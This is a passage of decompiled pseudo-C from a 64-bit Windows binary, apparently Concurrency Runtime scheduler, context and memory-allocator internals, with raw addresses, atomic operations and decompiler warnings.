      MEMORY[0x771C4CC0](a1 + 16, v13);
      if ( (unsigned __int16)MEMORY[0x771A31E0](a1 + 16) > *(int *)(a1 + 116)
        && !sub_13F14A2E4(*(_QWORD *)(a1 + 72))
        && !_InterlockedCompareExchange((volatile signed __int32 *)(a1 + 120), 1, 0) )
      {
        v14 = MEMORY[0x771B51E0](a1 + 16);
        v15 = *(_QWORD *)(a1 + 72);
        *(_QWORD *)(a1 + 32) = v14;
        sub_13F14AA74(
          (__int64 (__fastcall **)(__int64))(a1 + 40),
          (__int64 (__fastcall *)(__int64))sub_13F1545C4,
          (__int64 (__fastcall *)(__int64))a1,
          v15);
      }
    }
  }
  return 1;
}

//----- (000000013F154E70) ----------------------------------------------------
char __fastcall sub_13F154E70(signed __int64 a1)
{
  __int64 v2; // rdx
  unsigned int v3; // ecx
  unsigned int v4; // ecx
  __int64 v5; // rax
  __int64 v6; // rbx
  __int64 v7; // rdi
  void (__fastcall *v8)(__int64, __int64); // rbx
  __int64 v9; // rax
  _QWORD *v10; // rax
  __int64 v11; // rcx
  int v13[2]; // [rsp+20h] [rbp-28h] BYREF
  __int64 v14; // [rsp+28h] [rbp-20h]
  __int64 v15; // [rsp+30h] [rbp-18h]

  sub_13F14B8AC(**(_QWORD **)(a1 + 120), a1 + 328);
  sub_13F154A10(**(_QWORD **)(a1 + 120) + 72i64, *(_DWORD *)(a1 + 212));
  _InterlockedDecrement((volatile signed __int32 *)(*(_QWORD *)(a1 + 120) + 56i64));
  if ( !*(_BYTE *)(a1 + 256) )
    _InterlockedDecrement((volatile signed __int32 *)(**(_QWORD **)(a1 + 120) + 28i64));
  v2 = **(_QWORD **)(a1 + 120);
  v3 = *(_DWORD *)(a1 + 160) - *(_DWORD *)(a1 + 168);
  *(_DWORD *)(a1 + 168) = *(_DWORD *)(a1 + 160);
  _InterlockedExchangeAdd((volatile signed __int32 *)(v2 + 684), v3);
  v4 = *(_DWORD *)(a1 + 164) - *(_DWORD *)(a1 + 172);
  *(_DWORD *)(a1 + 172) = *(_DWORD *)(a1 + 164);
  _InterlockedExchangeAdd((volatile signed __int32 *)(v2 + 688), v4);
  if ( !*(_BYTE *)(a1 + 152) )
    sub_13F154A10(**(_QWORD **)(a1 + 120) + 120i64, *(_DWORD *)(a1 + 212));
  *(_QWORD *)(a1 + 184) = 0i64;
  while ( 1 )
  {
    v6 = *(_DWORD *)(a1 + 28) - *(_DWORD *)(a1 + 24) <= 0 ? 0i64 : sub_13F154C84(a1 + 24);
    if ( !v6 )
      break;
    v5 = sub_13F102FD0(v6 + 16);
    v13[0] = *(_DWORD *)(v5 + 24);
    v14 = *(_QWORD *)(v5 + 32);
    v13[1] = *(_DWORD *)(v5 + 28);
    v15 = *(_QWORD *)(v5 + 40);
    sub_13F158884((_QWORD *)v5, v6, (__int64)v13);
  }
  v7 = *(_QWORD *)(a1 + 136);
  v8 = *(void (__fastcall **)(__int64, __int64))(*(_QWORD *)v7 + 16i64);
  v9 = (*(__int64 (__fastcall **)(_QWORD))(***(_QWORD ***)(a1 + 120) + 104i64))(**(_QWORD **)(a1 + 120));
  v8(v7, v9);
  v10 = *(_QWORD **)(a1 + 120);
  *(_QWORD *)(a1 + 136) = 0i64;
  (*(void (__fastcall **)(_QWORD))(*(_QWORD *)*v10 + 8i64))(*v10);
  v11 = *(_QWORD *)(a1 + 144);
  if ( v11 )
  {
    sub_13F14BAE0(v11);
    *(_QWORD *)(a1 + 144) = 0i64;
  }
  return sub_13F154D30(*(_QWORD *)(a1 + 120) + 80i64, a1, *(_DWORD *)(a1 + 156), 1);
}
// 13F154FFF: conditional instruction was optimized away because cl.1==0
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1C5EB8: using guessed type int dword_13F1C5EB8;
// 13F1C5EBC: using guessed type char byte_13F1C5EBC;

//----- (000000013F155054) ----------------------------------------------------
char __fastcall sub_13F155054(__int64 a1)
{
  _DWORD *v2; // rdx
  __int64 v3; // rcx

  v2 = (_DWORD *)(a1 + 304);
  v3 = **(_QWORD **)(a1 + 120);
  if ( *v2 == *(_DWORD *)(v3 + 552) )
    return 0;
  *v2 = *(_DWORD *)(v3 + 552);
  return 1;
}

//----- (000000013F155068) ----------------------------------------------------
char __fastcall sub_13F155068(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 i; // rax
  char v8[8]; // [rsp+20h] [rbp-28h] BYREF
  int v9; // [rsp+28h] [rbp-20h]
  __int64 (__fastcall *v10)(); // [rsp+30h] [rbp-18h]

  if ( *(_QWORD *)(a1 + 184) )
  {
    v9 = 0;
    v10 = sub_13F142C2C;
    for ( i = *(_QWORD *)(a1 + 184); i; i = *(_QWORD *)(a1 + 184) )
      sub_13F141BF4((__int64)v8);
  }
  if ( a3 )
  {
    if ( !*(_QWORD *)(a3 + 64) )
      sub_13F156F18(a3, a2, 0i64, 0);
  }
  else
  {
    a3 = sub_13F158E98(a2, 0i64, 0);
  }
  if ( a3 )
  {
    (*(void (__fastcall **)(__int64, __int64))(*(_QWORD *)a1 + 32i64))(a1, a3);
    (*(void (__fastcall **)(_QWORD, _QWORD))(**(_QWORD **)(a1 + 136) + 40i64))(
      *(_QWORD *)(a1 + 136),
      *(_QWORD *)(a1 + 184));
    return 1;
  }
  else
  {
    sub_13F154B48(a1, 4, 1);
    sub_13F149168(**(_QWORD **)(a1 + 120));
    return 0;
  }
}
// 13F142C2C: using guessed type __int64 __fastcall sub_13F142C2C();
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F155068: using guessed type char var_28[8];

//----- (000000013F15514C) ----------------------------------------------------
void **sub_13F15514C()
{
  void *retaddr; // [rsp+68h] [rbp+0h] BYREF

  return &retaddr;
}
// 13F15514C: returning address of temporary local variable '%" r"'
// 13F1C5EC0: using guessed type __int64 qword_13F1C5EC0;
// 13F1C5EC8: using guessed type __int64 qword_13F1C5EC8;

//----- (000000013F1551E8) ----------------------------------------------------
__int64 __fastcall sub_13F1551E8(__int64 a1, __int64 a2)
{
  return a2;
}

//----- (000000013F1551EC) ----------------------------------------------------
__int64 *__fastcall sub_13F1551EC(__int64 a1, char a2, char a3)
{
  __int64 *result; // rax
  __int64 v7; // rbp
  unsigned int v8; // ebx
  __int64 v9; // rbx

  result = *(__int64 **)(a1 + 120);
  v7 = *result;
  if ( *(_BYTE *)(a1 + 152) )
  {
    if ( !a2 )
    {
      v8 = *(_DWORD *)(a1 + 212);
      *(_BYTE *)(a1 + 154) = 1;
      result = (__int64 *)sub_13F154AAC(v7 + 120, v8);
      v9 = 16 * v8;
      if ( *(_QWORD *)(*(_QWORD *)(v7 + 160) + 8 * v9) == 1i64 )
        result = (__int64 *)_InterlockedCompareExchange64(
                              (volatile signed __int64 *)(*(_QWORD *)(v7 + 160) + 8 * v9),
                              0i64,
                              1i64);
    }
  }
  else if ( a2 )
  {
    result = (__int64 *)sub_13F154A10(v7 + 120, *(_DWORD *)(a1 + 212));
  }
  *(_BYTE *)(a1 + 152) = a2;
  *(_BYTE *)(a1 + 153) = a3;
  return result;
}

//----- (000000013F1552A0) ----------------------------------------------------
void __fastcall sub_13F1552A0(__int64 a1)
{
  unsigned int v1; // edi
  unsigned int v3; // ebx
  unsigned __int64 v4; // r9
  unsigned int v5; // eax
  __int64 v6; // rcx
  __int64 v7; // rdx

  v1 = 0;
  v3 = (unsigned int)(*(_DWORD *)a1 + 31) >> 5;
  if ( v3 )
  {
    if ( v3 >= 4 )
    {
      v4 = *(_QWORD *)(a1 + 8);
      if ( v4 > a1 + 8 || v4 + 4i64 * (v3 - 1) < a1 + 8 )
      {
        v5 = v3 & 0xFFFFFFFC;
        do
          v1 += 4;
        while ( v1 < v5 );
        sub_13F15EF70(*(_QWORD *)(a1 + 8), 0, 16 * ((unsigned __int64)v5 >> 2));
      }
    }
    if ( v1 < v3 )
    {
      v6 = 4i64 * v1;
      v7 = v3 - v1;
      do
      {
        *(_DWORD *)(v6 + *(_QWORD *)(a1 + 8)) = 0;
        v6 += 4i64;
        --v7;
      }
      while ( v7 );
    }
  }
}

//----- (000000013F155334) ----------------------------------------------------
__int64 __fastcall sub_13F155334(__int64 a1, int *a2, int a3, __int64 *a4)
{
  __int64 v7; // rcx
  __int64 v8; // rdx
  __int64 v9; // rax
  __int64 v10; // rcx

  *(_QWORD *)(a1 + 8) = a4;
  v7 = a1 + 16;
  *(_DWORD *)v7 = 0;
  *(_QWORD *)(v7 + 8) = 0i64;
  sub_13F149020((int *)v7, a2);
  *(_DWORD *)(a1 + 32) = 4097;
  *(_DWORD *)(a1 + 36) = 0;
  v9 = sub_13F1790C4(32776i64, v8);
  *(_QWORD *)(a1 + 40) = v9;
  sub_13F15EF70(v9, 0, 8i64 * *(int *)(a1 + 32));
  *(_DWORD *)(a1 + 48) = 0;
  *(_DWORD *)(a1 + 52) = 0;
  *(_DWORD *)(a1 + 56) = 0;
  *(_DWORD *)(a1 + 60) = 0;
  *(_DWORD *)(a1 + 64) = a3;
  sub_13F147A00(a1 + 80, *a4, 256, 0x7FFFFFFF);
  v10 = *(_QWORD *)(a1 + 8);
  *(_QWORD *)a1 = *(_QWORD *)v10;
  *(_DWORD *)(a1 + 68) = *(_DWORD *)(v10 + 296);
  return a1;
}
// 13F15537F: variable 'v8' is possibly undefined
// 13F1790C4: using guessed type __int64 __fastcall sub_13F1790C4(_QWORD, _QWORD);

//----- (000000013F1553F8) ----------------------------------------------------
__int64 __fastcall sub_13F1553F8(__int64 a1)
{
  _QWORD *v2; // rbx
  void (__fastcall ***v3)(_QWORD, __int64); // rcx
  __int64 v4; // rdx
  _QWORD *v5; // rbx
  void (__fastcall ***v6)(_QWORD, __int64); // rcx
  _QWORD *v7; // rbx
  void (__fastcall ***v8)(_QWORD, __int64); // rcx
  _QWORD *v9; // rsi
  int v10; // ebx
  __int64 v11; // r14
  void (__fastcall ***v12)(_QWORD, __int64); // rcx
  _QWORD *v13; // rbx

  v2 = (_QWORD *)MEMORY[0x771B51E0]();
  while ( v2 )
  {
    v3 = (void (__fastcall ***)(_QWORD, __int64))(v2 - 36);
    v2 = (_QWORD *)*v2;
    if ( v3 )
      (**v3)(v3, 1i64);
  }
  v5 = (_QWORD *)MEMORY[0x771B51E0](a1 + 16);
  while ( v5 )
  {
    v6 = (void (__fastcall ***)(_QWORD, __int64))(v5 - 36);
    v5 = (_QWORD *)*v5;
    if ( v6 )
      (**v6)(v6, 1i64);
  }
  v7 = *(_QWORD **)(a1 + 32);
  while ( v7 )
  {
    v8 = (void (__fastcall ***)(_QWORD, __int64))(v7 - 36);
    v7 = (_QWORD *)*v7;
    if ( v8 )
      (**v8)(v8, 1i64);
  }
  v9 = *(_QWORD **)(a1 + 88);
  if ( v9 )
  {
    do
    {
      v10 = 0;
      if ( *(int *)(a1 + 80) > 0 )
      {
        v11 = 0i64;
        do
        {
          v12 = *(void (__fastcall ****)(_QWORD, __int64))(v11 + *v9);
          if ( v12 )
            (**v12)(v12, 1i64);
          ++v10;
          v11 += 8i64;
        }
        while ( v10 < *(_DWORD *)(a1 + 80) );
      }
      v13 = (_QWORD *)v9[1];
      sub_13F14088C(*v9, v4);
      sub_13F14088C(v9, 24i64);
      v9 = v13;
    }
    while ( v13 );
  }
  return sub_13F14088C(*(_QWORD *)(a1 + 96), v4);
}
// 13F1554E7: variable 'v4' is possibly undefined
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F155520) ----------------------------------------------------
__int64 __fastcall sub_13F155520(__int64 a1)
{
  __int64 v2; // rdx
  __int64 v3; // rdx

  sub_13F1553F8(a1 + 80);
  sub_13F14C6F4((int *)(a1 + 32));
  sub_13F14088C(*(_QWORD *)(a1 + 40), v2);
  return sub_13F14088C(*(_QWORD *)(a1 + 24), v3);
}
// 13F155543: variable 'v2' is possibly undefined
// 13F155556: variable 'v3' is possibly undefined
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F15555C) ----------------------------------------------------
__int64 __fastcall sub_13F15555C(__int64 a1, signed __int64 a2)
{
  __int64 v2; // rbx
  unsigned int v3; // esi
  char v4; // bp
  _QWORD *v7; // r9
  signed __int32 v8; // edx
  _QWORD *v9; // r8
  int v10; // er10
  int v11; // er11
  unsigned __int64 v12; // rcx
  unsigned __int128 v13; // rax
  __int64 v14; // r14
  __int64 v15; // rax
  __int64 v16; // rdx
  char v18[8]; // [rsp+20h] [rbp-48h] BYREF
  int v19; // [rsp+28h] [rbp-40h]
  __int64 (__fastcall *v20)(); // [rsp+30h] [rbp-38h]

  v2 = *(_QWORD *)(a1 + 88);
  v3 = 0;
  v4 = 0;
  do
  {
    if ( *(int *)(v2 + 16) >= -1 )
    {
      v7 = *(_QWORD **)v2;
      v8 = 0;
      if ( *(int *)(a1 + 80) > 0 )
      {
        v9 = *(_QWORD **)v2;
        while ( 1 )
        {
          if ( !*v9 )
          {
            v10 = v8 + v3;
            *(_DWORD *)(a2 + 156) = v8 + v3;
            v11 = *(_DWORD *)(a1 + 112);
            if ( !_InterlockedCompareExchange64(&v7[v8], a2, 0i64) )
              break;
          }
          ++v8;
          ++v9;
          if ( v8 >= *(_DWORD *)(a1 + 80) )
            goto LABEL_12;
        }
        v4 = 1;
        v3 += v8;
        if ( v10 >= v11 )
          _InterlockedAdd((volatile signed __int32 *)(a1 + 112), 1u);
        _InterlockedCompareExchange((volatile signed __int32 *)(v2 + 16), -1, v8);
      }
    }
LABEL_12:
    if ( !v4 )
    {
      _InterlockedCompareExchange((volatile signed __int32 *)(v2 + 16), -2, -1);
      v3 += *(_DWORD *)(a1 + 80);
      if ( !*(_QWORD *)(v2 + 8) && !_InterlockedCompareExchange64((volatile signed __int64 *)(v2 + 8), 1i64, 0i64) )
      {
        v12 = *(int *)(a1 + 80);
        v13 = v12 * (unsigned __int128)8ui64;
        if ( !is_mul_ok(v12, 8ui64) )
          *(_QWORD *)&v13 = -1i64;
        v14 = sub_13F1790C4(v13, *((_QWORD *)&v13 + 1));
        sub_13F15EF70(v14, 0, 8i64 * *(int *)(a1 + 80));
        v15 = sub_13F14059C(24i64);
        v16 = v15;
        if ( v15 )
        {
          *(_QWORD *)(v15 + 8) = 0i64;
          *(_QWORD *)v15 = v14;
          *(_DWORD *)(v15 + 16) = -1;
        }
        else
        {
          v16 = 0i64;
        }
        if ( *(_DWORD *)(a1 + 108) < *(_DWORD *)(a1 + 104) )
          *(_QWORD *)(*(_QWORD *)(a1 + 96) + 8i64 * (int)(*(_DWORD *)(a1 + 108))++) = v16;
        _InterlockedExchange64((volatile __int64 *)(v2 + 8), v16);
      }
      if ( *(_QWORD *)(v2 + 8) == 1i64 )
      {
        v19 = 0;
        v20 = sub_13F142C6C;
        do
          sub_13F141BF4((__int64)v18);
        while ( *(_QWORD *)(v2 + 8) == 1i64 );
      }
    }
    v2 = *(_QWORD *)(v2 + 8);
  }
  while ( !v4 );
  return v3;
}
// 13F142C6C: using guessed type __int64 __fastcall sub_13F142C6C();
// 13F1790C4: using guessed type __int64 __fastcall sub_13F1790C4(_QWORD, _QWORD);
// 13F15555C: using guessed type char var_48[8];

//----- (000000013F1556DC) ----------------------------------------------------
signed __int64 __fastcall sub_13F1556DC(volatile signed __int32 **a1, __int64 a2, char a3)
{
  volatile signed __int32 **v6; // rbp
  __int64 v7; // rsi
  __int64 v8; // rax
  signed __int64 v9; // rbx
  __int64 v10; // rdx
  __int64 v11; // rdx

  v6 = a1 + 10;
  v7 = sub_13F1492D4();
  v8 = MEMORY[0x771DAED0](v6);
  if ( !v8 || (v9 = v8 - 288, v8 == 288) )
    v9 = (*(__int64 (__fastcall **)(volatile signed __int32 *, volatile signed __int32 **, __int64))(*(_QWORD *)*a1 + 184i64))(
           *a1,
           a1,
           a2);
  else
    (*(void (__fastcall **)(signed __int64, volatile signed __int32 **, __int64))(*(_QWORD *)v9 + 48i64))(v9, a1, a2);
  if ( a3 )
  {
    *(_BYTE *)(v9 + 256) = 1;
    *(_QWORD *)(v9 + 264) = v7 - 16;
    *(_QWORD *)(v7 + 256) = v9;
  }
  _InterlockedIncrement((volatile signed __int32 *)a1 + 14);
  sub_13F154AAC((__int64)(*a1 + 18), *(_DWORD *)(v9 + 212));
  if ( *((_DWORD *)*a1 + 169) == *((_DWORD *)*a1 + 170) && *((int *)*a1 + 7) > 0 )
  {
    sub_13F15555C((__int64)(a1 + 10), v9);
    LOBYTE(v10) = 1;
    if ( sub_13F14C594(*a1, v10) )
    {
      if ( v7 )
        v11 = sub_13F102FD0(v7);
      else
        v11 = *((_QWORD *)a1[1] + 2);
      (*(void (__fastcall **)(signed __int64, __int64, _QWORD))(*(_QWORD *)v9 + 56i64))(v9, v11, 0i64);
    }
  }
  else
  {
    sub_13F15555C((__int64)(a1 + 10), v9);
    sub_13F154B48(v9, 1, 0);
  }
  return v9;
}
// 13F1557C0: variable 'v10' is possibly undefined
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F155830) ----------------------------------------------------
char __fastcall sub_13F155830(_QWORD **a1)
{
  __int64 v2; // rax
  __int64 v3; // r10
  _QWORD *v4; // rbx
  int v5; // eax
  __int64 v6; // r11
  unsigned int v7; // er9
  char v8; // r8
  int v9; // eax

  v2 = sub_13F1492D4();
  v3 = v2 + 248;
  if ( !v2 )
    v3 = 264i64;
  v4 = *a1;
  v5 = 0;
  v6 = 0i64;
  v7 = (unsigned int)(*(_DWORD *)(*v4 + 96i64) + 31) >> 5;
  if ( !v7 )
    return 0;
  v8 = 1;
  while ( !v5 )
  {
    v5 = *(_DWORD *)(*(_QWORD *)(*v4 + 104i64) + 4 * v6) & *(_DWORD *)(v4[2] + 4 * v6);
    v6 = (unsigned int)(v6 + 1);
    if ( (unsigned int)v6 >= v7 )
    {
      if ( !v5 )
        return 0;
      break;
    }
  }
  v9 = *(_DWORD *)(v4[2] + 4 * ((unsigned __int64)*(unsigned int *)(*(_QWORD *)v3 + 212i64) >> 5));
  if ( _bittest(&v9, *(_DWORD *)(*(_QWORD *)v3 + 212i64) & 0x1F) )
    return 0;
  return v8;
}

//----- (000000013F1558C4) ----------------------------------------------------
__int64 __fastcall sub_13F1558C4(__int64 a1, __int64 a2)
{
  int v2; // er11
  int v3; // er9
  int v6; // edx
  __int64 v7; // rcx
  __int64 v8; // r10
  int v9; // edx
  _QWORD *v10; // r10
  __int64 v11; // rcx
  __int64 result; // rax

  v2 = *(_DWORD *)(a1 + 192);
  v3 = 0;
  if ( v2 <= 0 )
    return 0i64;
  while ( 1 )
  {
    v6 = v3 >> *(_DWORD *)(a1 + 164);
    if ( v6 < *(_DWORD *)(a1 + 188) )
    {
      v7 = *(int *)(a1 + 184);
      v8 = *(_QWORD *)(a1 + 176);
      if ( v6 < (int)v7 )
      {
        v10 = *(_QWORD **)(v8 + 8i64 * v6);
      }
      else
      {
        v9 = v6 - v7;
        v10 = *(_QWORD **)(v8 + 8 * v7 - 8);
        if ( v9 >= 0 )
        {
          v11 = (unsigned int)(v9 + 1);
          do
          {
            v10 = (_QWORD *)v10[1];
            --v11;
          }
          while ( v11 );
        }
      }
      result = *(_QWORD *)(*v10 + 8 * (v3 & (unsigned __int64)(*(int *)(a1 + 160) - 1i64)));
      if ( result )
      {
        if ( *(_QWORD *)(result + 136) == a2 )
          break;
      }
    }
    if ( ++v3 >= v2 )
      return 0i64;
  }
  return result;
}

//----- (000000013F15595C) ----------------------------------------------------
__int64 __fastcall sub_13F15595C(__int64 a1, __int64 a2)
{
  int v5; // er8
  int v6; // edx
  __int64 v7; // rcx
  __int64 v8; // r11
  int v9; // edx
  _QWORD *v10; // r11
  __int64 v11; // rcx
  unsigned __int64 v12; // rcx
  __int64 v13; // rdx

  if ( (*(_DWORD *)a2 & 0xFFFFFFF) != 3 )
    return 0i64;
  if ( *(_DWORD *)(a2 + 4) == *(_DWORD *)(*(_QWORD *)a1 + 600i64) )
    return *(_QWORD *)(a2 + 16);
  v5 = 0;
  if ( *(int *)(a1 + 192) <= 0 )
    return 0i64;
  while ( 1 )
  {
    v6 = v5 >> *(_DWORD *)(a1 + 164);
    if ( v6 < *(_DWORD *)(a1 + 188) )
    {
      v7 = *(int *)(a1 + 184);
      v8 = *(_QWORD *)(a1 + 176);
      if ( v6 < (int)v7 )
      {
        v10 = *(_QWORD **)(v8 + 8i64 * v6);
      }
      else
      {
        v9 = v6 - v7;
        v10 = *(_QWORD **)(v8 + 8 * v7 - 8);
        if ( v9 >= 0 )
        {
          v11 = (unsigned int)(v9 + 1);
          do
          {
            v10 = (_QWORD *)v10[1];
            --v11;
          }
          while ( v11 );
        }
      }
      v12 = v5 & (unsigned __int64)(*(int *)(a1 + 160) - 1i64);
      v13 = *(_QWORD *)(*v10 + 8 * v12);
      if ( v13 )
      {
        if ( *(_DWORD *)(v13 + 208) == *(_DWORD *)(a2 + 8) )
          break;
      }
    }
    if ( ++v5 >= *(_DWORD *)(a1 + 192) )
      return 0i64;
  }
  return *(_QWORD *)(*v10 + 8 * v12);
}

//----- (000000013F155A18) ----------------------------------------------------
char __fastcall sub_13F155A18(__int64 a1, __int64 a2, _DWORD *a3, int a4)
{
  __int64 v7; // rax
  int v8; // edi
  int v9; // edx
  __int64 v10; // rcx
  __int64 v11; // r8
  int v12; // edx
  _QWORD *v13; // r8
  __int64 v14; // rcx
  __int64 v15; // rcx

  if ( (*a3 & 0xFFFFFFF) != 3 || (v7 = sub_13F15595C(a1, (__int64)a3)) == 0 || !sub_13F1545CC(v7, a2, a4, 1) )
  {
    v8 = 0;
    if ( *(int *)(a1 + 192) <= 0 )
      return 0;
    while ( 1 )
    {
      v9 = v8 >> *(_DWORD *)(a1 + 164);
      if ( v9 < *(_DWORD *)(a1 + 188) )
      {
        v10 = *(int *)(a1 + 184);
        v11 = *(_QWORD *)(a1 + 176);
        if ( v9 < (int)v10 )
        {
          v13 = *(_QWORD **)(v11 + 8i64 * v9);
        }
        else
        {
          v12 = v9 - v10;
          v13 = *(_QWORD **)(v11 + 8 * v10 - 8);
          if ( v12 >= 0 )
          {
            v14 = (unsigned int)(v12 + 1);
            do
            {
              v13 = (_QWORD *)v13[1];
              --v14;
            }
            while ( v14 );
          }
        }
        v15 = *(_QWORD *)(*v13 + 8 * (v8 & (unsigned __int64)(*(int *)(a1 + 160) - 1i64)));
        if ( v15 )
        {
          if ( sub_13F1545CC(v15, a2, a4, 1) )
            break;
        }
      }
      if ( ++v8 >= *(_DWORD *)(a1 + 192) )
        return 0;
    }
  }
  return 1;
}

//----- (000000013F155B0C) ----------------------------------------------------
__int64 __fastcall sub_13F155B0C(int *a1, __int64 a2)
{
  int v4; // eax

  v4 = (*(__int64 (__fastcall **)(_QWORD))(**(_QWORD **)a1 + 8i64))(*(_QWORD *)a1);
  sub_13F15BED8(a2, 2, a1[17], v4, (__int64)a1);
  return a2;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F155B54) ----------------------------------------------------
__int64 __fastcall sub_13F155B54(int *a1, char a2)
{
  bool i; // cc
  __int64 v5; // rdi
  __int64 v6; // rcx
  __int64 v7; // r8
  unsigned int *v8; // r9
  __int64 v9; // r10
  __int64 v10; // r8

  for ( i = *a1 < a1[1]; ; i = *a1 < a1[1] )
  {
    if ( !i )
      return 0i64;
    v5 = *a1;
    v6 = v5 & a1[2];
    if ( (*(_BYTE *)(*((_QWORD *)a1 + 2) + 8 * v6) & 1) != 0
      && !a2
      && sub_13F155830((_QWORD **)(*((_QWORD *)a1 + 3) + 16 * v6)) )
    {
      return 0i64;
    }
    v7 = _InterlockedExchange64((volatile __int64 *)(*((_QWORD *)a1 + 2) + 8 * (v5 & a1[2])), 0i64);
    if ( (v7 & 1) == 0 )
      break;
    v7 &= ~1ui64;
    v8 = (unsigned int *)(*((_QWORD *)a1 + 3) + 16 * (v5 & a1[2]));
    v9 = *(_QWORD *)(*(_QWORD *)(*(_QWORD *)v8 + 24i64) + 8i64 * v8[2]);
    if ( v9 != 1
      && _InterlockedExchange64((volatile __int64 *)(*(_QWORD *)(*(_QWORD *)v8 + 24i64) + 8i64 * v8[2]), 1i64) == v9 )
    {
      break;
    }
    v10 = *(_QWORD *)v8;
    if ( _InterlockedExchangeAdd((volatile signed __int32 *)(*(_QWORD *)v8 + 36i64), 0xFFFFFFFF) == 1 )
      sub_13F14AA74(
        (__int64 (__fastcall **)(__int64))(v10 + 48),
        (__int64 (__fastcall *)(__int64))sub_13F14EF30,
        (__int64 (__fastcall *)(__int64))v10,
        *(_QWORD *)v10);
    *a1 = v5 + 1;
  }
  if ( v7 )
    *a1 = v5 + 1;
  return v7;
}

//----- (000000013F155C60) ----------------------------------------------------
__int64 __fastcall sub_13F155C60(__int64 a1)
{
  *(_DWORD *)a1 = 0;
  *(_QWORD *)(a1 + 8) = sub_13F142890(0i64);
  return a1;
}

//----- (000000013F155C80) ----------------------------------------------------
void __fastcall sub_13F155C80(__int64 a1)
{
  __int64 *v2; // rax
  __int64 v3; // rdx

  if ( *(_DWORD *)a1 )
  {
    do
    {
      v2 = (__int64 *)sub_13F142890(*(_QWORD *)(a1 + 8));
      v3 = *v2;
      *(_QWORD *)(a1 + 8) = *v2;
      sub_13F14088C(v2, v3);
    }
    while ( (*(_DWORD *)a1)-- != 1 );
  }
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F155CBC) ----------------------------------------------------
__int64 *__fastcall sub_13F155CBC(__int64 a1)
{
  __int64 *result; // rax
  __int64 v3; // rdx

  result = (__int64 *)sub_13F142890(*(_QWORD *)(a1 + 8));
  if ( result )
  {
    v3 = *result;
    --*(_DWORD *)a1;
    *(_QWORD *)(a1 + 8) = v3;
  }
  return result;
}

//----- (000000013F155CE4) ----------------------------------------------------
__int64 *__fastcall sub_13F155CE4(__int64 a1, __int64 a2)
{
  __int64 v2; // rdi
  int v4; // eax
  __int64 v5; // rdx
  __int64 v6; // rbx
  __int64 *v7; // rdi

  v2 = a2 + 8;
  v4 = sub_13F155DD4(a2 + 8);
  v6 = v4;
  if ( v4 == -1 )
    goto LABEL_4;
  v7 = sub_13F155CBC(a1 + 16 * (v4 + 1i64));
  if ( !v7 )
  {
    v2 = *((int *)qword_13F18B900 + v6);
LABEL_4:
    v7 = (__int64 *)sub_13F1790C4(v2, v5);
  }
  *v7 = sub_13F142890(v6);
  return v7 + 1;
}
// 13F155D30: variable 'v5' is possibly undefined
// 13F1790C4: using guessed type __int64 __fastcall sub_13F1790C4(_QWORD, _QWORD);
// 13F18B900: using guessed type __int64 qword_13F18B900[49];

//----- (000000013F155D58) ----------------------------------------------------
char __fastcall sub_13F155D58(__int64 a1, _QWORD *a2)
{
  unsigned __int64 v3; // rax

  if ( *(int *)a1 >= 32 )
    return 0;
  *a2 = *(_QWORD *)(a1 + 8);
  v3 = sub_13F142890((__int64)a2);
  ++*(_DWORD *)a1;
  *(_QWORD *)(a1 + 8) = v3;
  return 1;
}

//----- (000000013F155D88) ----------------------------------------------------
char __fastcall sub_13F155D88(__int64 a1, __int64 a2)
{
  _QWORD *v2; // rbx
  int v4; // eax
  __int64 v5; // rdx
  char result; // al

  v2 = (_QWORD *)(a2 - 8);
  v4 = sub_13F142890(*(_QWORD *)(a2 - 8));
  if ( v4 == -1 )
    return sub_13F14088C(v2, v5);
  result = sub_13F155D58(a1 + 16 * (v4 + 1i64), v2);
  if ( !result )
    return sub_13F14088C(v2, v5);
  return result;
}
// 13F155DC2: variable 'v5' is possibly undefined
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F155DD4) ----------------------------------------------------
__int64 __fastcall sub_13F155DD4(__int64 a1)
{
  unsigned __int64 v1; // rdx
  unsigned __int64 v3; // rdx
  int v4; // ecx

  v1 = (a1 + 15) & 0xFFFFFFFFFFFFFFF0ui64;
  if ( v1 > 0x2000 )
    return 0xFFFFFFFFi64;
  v3 = v1 >> 4;
  if ( (int)v3 > 32 )
  {
    v4 = 5;
    if ( (v3 & 0x80000000) == 0i64 && (v3 & 0xFFFFFFE0) != 0 )
    {
      do
        ++v4;
      while ( (int)v3 >> v4 > 0 );
    }
    LODWORD(v3) = 16 * (v4 - 5) + ((~((1 << (v4 - 5)) - 1) & ((1 << (v4 - 5)) - 1 + (int)v3)) >> (v4 - 5));
  }
  return (unsigned int)(v3 - 1);
}

//----- (000000013F155E28) ----------------------------------------------------
unsigned __int64 *__fastcall sub_13F155E28(__int64 a1)
{
  __int64 v1; // rbx
  int v2; // eax
  __int64 v3; // rdx
  __int64 v4; // rdi
  unsigned __int64 *v5; // rbx

  v1 = a1 + 8;
  v2 = sub_13F155DD4(a1 + 8);
  v4 = v2;
  if ( v2 != -1 )
    v1 = *((int *)qword_13F18B900 + v2);
  v5 = (unsigned __int64 *)sub_13F1790C4(v1, v3);
  *v5 = sub_13F142890(v4);
  return v5 + 1;
}
// 13F155E54: variable 'v3' is possibly undefined
// 13F1790C4: using guessed type __int64 __fastcall sub_13F1790C4(_QWORD, _QWORD);
// 13F18B900: using guessed type __int64 qword_13F18B900[49];

//----- (000000013F155E78) ----------------------------------------------------
__int64 __fastcall sub_13F155E78(__int64 a1, __int64 a2)
{
  __int64 result; // rax

  *(_QWORD *)a1 = &Concurrency::IExecutionContext::`vftable';
  sub_13F14DC58(a1 + 16, a2, 0);
  *(_QWORD *)a1 = off_13F18BBB0;
  *(_QWORD *)(a1 + 16) = off_13F18BC00;
